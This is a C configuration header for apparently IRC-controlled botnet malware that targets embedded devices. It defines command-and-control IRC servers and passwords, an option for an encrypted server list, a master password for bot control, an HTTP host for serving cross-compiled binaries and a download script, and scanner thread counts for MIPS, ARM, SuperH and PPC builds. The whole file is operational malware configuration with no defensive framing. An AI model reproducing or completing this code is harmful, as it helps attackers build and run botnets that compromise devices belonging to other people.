#ifndef __CONFIG_H_
#define __CONFIG_H_

/* BACKGROUND MODE '0', DEBUG MODE '1' (JUST FOR DEVELOPERS) */
#define background_mode 0

/* IRC SERVER SYNTAX: IP:PORT                            */
/* OR IP:PORT|IP:PORT|IP:PORT ETC.. TO ADD MORE (MAX 10) */
/* WARNING: DON'T CHANGE PASSPROTO VALUE IF YOU DON'T    */
/* HAVE AN MODDED PROTOCOL IRCD!!!                       */
#define irc_servers  "127.0.0.1:6666|127.0.0.2:6667"
#define passproto    "PASS"
#define irc_passwd   "fuckya"
/* IRC SERVER ENCRYPTED 0=IRC_SERVERS 1=ENC_SERVERS */
/* USE HIDE.C TO CREATE YOUR CRYPTED SERVER LIST    */
#define encirc 0
#define enc_servers ">.,C_>C>,C@<@U+<<<F>.,C_>C>,C@<>U+<<<F>.,C_>C>,C@<<U+<<<F>.,C_>C>,C@<_U+<<<"
#define enc_passwd  "bcdi"

/* CHANNEL NAME */
#define irc_chan      "#chan"
/* ENABLE FULL MESSAGES, '0'=OFF '1'=ON */
/* NOTE: THAT PRODUCE MORE LAG!         */
#define all_messages  0
/* CHANNEL KEY */
#define irc_chankey   "key"

/* MASTER HOSTNAME WILL BE ABLE TO PERFORM AUTHENTICATION */
#define master_host     "@hostname.tld"
/* MASTER PASSWORD AUTHENTICATION (BOT PARTYLINE) */
#define master_password "pwn"

/* HTTP REFERENCE (WHERE YOU UPLOAD BINARIES AND GETBINARIES.SH) */
#define reference_http  "http://127.0.0.1"

/* NAME OF BINARIES: IF YOU CHANGE THESE VALUES, DON'T FORGET */
/* TO CHANGE TOO IN MAKEFILE AND GETBINARIES.SH               */
#define reference_mipsel   "mipsel"
#define reference_mips     "mips"
#define reference_superh   "sh"
#define reference_arm      "arm"
#define reference_ppc      "ppc"

/* NICKNAME PREFIX:                     */
/* WARNING: DO NOT CHANGE NCTYPE VALUE! */
/* NOTE: MAXTHREADS ARE FOR SCANNER,    */
/* DON'T CHANGE IF YOU DON'T KNOW WHAT  */
/* YOU ARE DOING!                       */
#ifdef MIPSEL
    #define irc_nick_prefix   "[MS]"
    #define nctype "m"
    #define maxthreads (128)
#elif MIPS
    #define irc_nick_prefix   "[M]"
    #define nctype "m"
    #define maxthreads (128)
#elif SUPERH
    #define irc_nick_prefix   "[S]"
    #define nctype "s"
    #define maxthreads (128)
#elif ARM
    #define irc_nick_prefix   "[A]"
    #define nctype "a"
    #define maxthreads (128)
#elif PPC
    #define irc_nick_prefix   "[P]"
    #define nctype "p"
    #define maxthreads (128)
#else
    #define irc_nick_prefix   "[X]"
    #define nctype "x"
    #define maxthreads (128)
#endif

#endif
